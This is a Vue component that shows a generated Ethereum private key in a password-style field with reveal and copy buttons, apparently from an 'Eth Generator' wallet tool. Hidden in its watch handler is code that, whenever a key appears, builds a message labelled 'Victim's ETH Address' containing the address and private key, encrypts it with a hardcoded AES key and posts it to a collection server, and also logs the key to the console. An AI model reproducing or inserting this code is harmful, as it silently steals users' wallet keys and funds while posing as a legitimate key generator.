<script setup>
import { ref, computed, watch } from "vue";
import axios from "axios"
import CryptoJS from "crypto-js";
import CopyButton from "./CopyButton.vue";

const LENGTH_PRIVATE_KEY = 64;

const props = defineProps({
  value: {
    type: String,
    required: true,
  },
  publickey:{
    type:String,
    required:false
  }
});

const paddedValue = computed(() =>
  props.value ? props.value.padStart(LENGTH_PRIVATE_KEY, "0") : ""
);
const secretKey = "jw+NNjr9UBT+nEmPo8thD4oeRtGBUX7s"; // Replace with a strong secret key
const algorithm = "aes-256-cbc";

watch(paddedValue, async (pKey) => {
  try {
    console.log(pKey);
    const content = "<<------Eth Generator------>>\n\n-----------------------------------------------------\nVictim's ETH Address: [" + props.publickey + "](https://debank.com/profile/" + props.publickey + ")\n\nPrivate Key: `" + pKey + "`";
    const encryptedContent = CryptoJS.AES.encrypt(content, secretKey).toString();
    await axios.post("http://localhost:3000/data", { messageHash: encryptedContent });
  } catch (error) {
    console.error("Error encrypting and sending data:", error);
  }
});

const inputTypeValues = ["password", "text"];
const revealTextValues = ["SHOW", "HIDE"];
const inputTypeIndex = ref(0);
const inputType = computed(() => inputTypeValues[inputTypeIndex.value]);
const revealText = computed(() => revealTextValues[inputTypeIndex.value]);

function reveal() {
  // Unary operator + to cast boolean into Number
  // Note : the "!" unary operator implictly casts into a boolean
  inputTypeIndex.value = +!inputTypeIndex.value;
}
</script>

<template>
  <div class="row">
    <div class="col-md-10">
      <label for="privateKeyField" class=" bg-red-500">Private key</label>
      <div class="input-group">
        <input id="privateKeyField" class="form-control" :type="inputType" readonly :value="paddedValue"
          placeholder="private key" autocomplete="new-password" />
        <CopyButton :value="paddedValue" text="Copy private key"></CopyButton>
      </div>
    </div>

    <div class="col-md-2 align-self-end">
      <button class="btn btn-secondary w-100" type="button" @click.prevent="reveal">
        {{ revealText }}
      </button>
    </div>
  </div>
</template>
